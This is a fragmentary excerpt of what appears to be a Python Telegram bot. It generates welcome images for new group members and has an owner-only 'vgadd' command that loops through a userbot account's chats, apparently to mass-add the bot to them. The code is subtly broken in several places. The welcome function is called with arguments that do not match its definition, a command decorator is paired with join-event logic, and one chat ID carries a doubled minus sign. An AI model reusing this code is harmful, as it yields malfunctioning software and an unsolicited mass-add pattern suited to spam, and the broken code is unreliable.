...
def welcomepic(pic, user, chatname, id, uname, brightness_factor=1.3):
    background = Image.open("FIXXMUSIC/assets/Vashuwel2(1)-^.png")
    pfp = Image.open(pic).convert("RGBA")
    pfp = circle(pfp, brightness_factor=brightness_factor)
    pfp = pfp.resize((635, 635))
    draw = ImageDraw.Draw(background)
    font = ImageFont.truetype('FIXXMUSIC/assets/font.ttf', size=70)
    welcome_font = ImageFont.truetype('FIXXMUSIC/assets/font.ttf', size=61)
...
@app.on_message(filters.command("vwelcome", "vashuwelcome") & ~filters.private)
    ...
    if member.new_chat_member and not member.old_chat_member and member.new_chat_member.status != "kicked":
        ...
        try:
            welcomeimg = welcomepic(
                pic, group_name.group_name, user.first_name, member.chat.title, user.id, user.username
            )
            button_text = "๏ ᴠɪᴇᴡ ɴᴇᴡ ᴍᴇᴍʙᴇʀ ๏"
            add_button_text = "๏ 𝘼𝘿𝘿 𝙈𝙀 𝙄𝙉 𝙔𝙊𝙐𝙍 𝙂𝙍𝙊𝙐𝙋 𝘼𝙉𝘿 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝘽𝘼𝘽𝙔 ๏"
...
@app.on_message(filters.command("vgadd") & filters.user(1321796330))
async def add_all(client, message):
    ...
    try:
        ...
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == --1001722570047:
                continue
            try:
